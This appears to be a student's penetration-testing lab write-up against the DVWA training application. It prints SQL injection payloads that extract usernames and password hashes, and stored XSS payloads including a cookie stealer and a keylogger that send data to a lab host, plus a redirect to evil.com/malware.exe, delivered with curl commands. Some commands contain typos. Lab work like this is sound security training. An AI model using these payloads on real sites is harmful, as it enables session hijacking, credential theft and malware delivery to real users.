# Web Application Securitiy Testing

## Instructions:
### Technical Scope:

- DVWA
- SQLi, 
- XSS
- PHP Webshell
- Msfvenom webshell (Meterpreter)

### Tasks:

1. Perform DVWA SQL Injection: Enumerate databases/columns.
2. Perform DVWA Stored XSS attack: Demonstrate stored XSS in DVWA Guestbook.
3. Create PHP webshell: Upload via DVWA file upload, then execute webshell with OS commands (for example: “ls” or “whoami”). 
4. Create a webshell with msfvenom: Upload to DVWA, run Metasploit multi-handler, call the shell and establish a reverse meterpreter session.
5. Document all attacks with screenshots (payload input + result).
6. Update VAPT report with methodology, screenshots, severity, and remediation recommendations. Students can also suggest mitigating controls to minimize the risk of compromise.


## DVWA - SQL injection

Login to DVWA

![Deepaks-steps-sql-injection](Deepaks-steps-sql-injection.png)

![dvwa-low-security](dvwa-low-security.png)


1. Break the developers' code

```
1'
' OR 1=1
```

![SQL-injection-1](SQL-injection-1.png)



2. Balance the query commenting vectors

```
' OR 1=1 -- -
' OR 'a'='a
' UNION SELECT 1,2 -- -
' UNION SELECT database(),user() -- -
' UNION SELECT null,@@version -- -
```

![SQL-injection-2](SQL-injection-2.png)
![SQL-injection-3](SQL-injection-3.png)
![SQL-injection-4](SQL-injection-4.png)
![SQL-injection-5](SQL-injection-5.png)

Then we know that that

```
database-name = dvwa
user = root@localhost
```

3. Find the number of columns

```
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
```

![SQL-injection-order-by-1](SQL-injection-order-by-1.png)
![SQL-injection-order-by-2](SQL-injection-order-by-2.png)
![SQL-injection-order-by-3](SQL-injection-order-by-3.png)

Then, we have access to vulnerable 2 columns. 

4. Find vulnerable columns

```
' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT null, schema_name FROM information_schema.schemata -- -
```
![SQL-injection-table-name](SQL-injection-table-name.png)

![SQL-injection-schema-name](SQL-injection-schema-name.png)

schema_name from information_schema

```
>> dvwa
>> flag334422
>> metasploit
>> mysql
>> owasp10
>> tikiwiki
>> tikiwiki195
```

5. Change the pointers location

```
' UNION SELECT null,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -
```

![SQL-injection-column-name](SQL-injection-column-name.png)

column_name:

```
>> user_id
>> first_name
>> last_name
>> user
>> password
>> avatar
```


6. Extracting sensible data

```
' UNION SELECT null,CONCAT(user,':',password) FROM users -- -
' UNION SELECT user,password FROM users -- -
' UNION SELECT CONCAT(user_id,':',first_name,':',last_name,':',user),password FROM users -- -
```

![SQL-injection-user-password-1](SQL-injection-user-password-1.png)
![SQL-injection-user-password-2](SQL-injection-user-password-2.png)
![SQL-injection-user-password-3](SQL-injection-user-password-3.png)

<!-- revisar lo de hash -->

## DVWA - stored XSS attack

#### Basic attacks:
```
<script>alert('XSS')</script>
```
![XSS-alert](XSS-alert.png)

```
<svg onload=alert('XSS')>
```

![XSS-alert-svg](XSS-alert-svg.png)

```
<img src=x onerror=alert('XSS')>
```

![XSS-alert-img](XSS-alert-img.png)

#### Attack of cookies steal XSS reflected

```
<script>
document.write('<img src="http://192.168.57.10/steal.php?c=' + document.cookie + '" />')
</script>
```

![XSS-reflected-.10-cookies](XSS-reflected-.10-cookies.png)

#### Redirection to a malicious site

```
<script>
window.location.href = "http://evil.com/malware.exe"
</script>
```
![XSS-reflected-malicious-site](XSS-reflected-malicious-site.png)

Since we have limitations to type down such a script, we are going to try to do this from the terminal instead:

```
curl -v -X POST \ 
    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
    -H "Content-Type: application/x-www-form-urlenconded" \
    -d "txtName-LongXSS&mtxMessage=${MALICIOUS_SITE_PAYLOAD}&btnSign=Sign+Guestbook" \
    "${DVWA_URL}/vulnerabilities/xss_s/" > malicious_site_payload.txt
```

![XSS-reflected-malicious-site-1](XSS-reflected-malicious-site-1.png)

The output may be find in `malicious_site_payload.txt``

From which we found that the attack was successful:

![XSS-reflected-malicious-site-2](XSS-reflected-malicious-site-2.png)

```
<div id="guestbook_comments">
  Name: MalwareRedirect 
    Message:
      <script>
        window.location.href="http://evil.com/malware.exe";
      </ script>
</div>  
```


#### JavaScript Keylogger 

```
<script>
document.onkeypress = function(e) {
  var img = new Image();
  img.src = 'http://192.168.57.10/log.php?key=' + e.key;
}
</script>
```

Run in the terminal as:

```
curl -v -X POST \ 
    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
    -H "Content-Type: application/x-www-form-urlenconded" \
    --data-urlencode="txtName=JS-keylogger" \
    --data-urlencode="mtxtMessage=${JAVASCRIPT_KELOGGER_PAYLOAD}" \
    -d "btnSign=Sign+Guestbook" \
    "${DVWA_URL}/vulnerabilities/xss_s/" > javascript_keylogger_payload.txt
```
![XSS-reflected-JS-keylogger](XSS-reflected-JS-keylogger.png)

Which means that we were not successful on doing an XSS-attack in this case

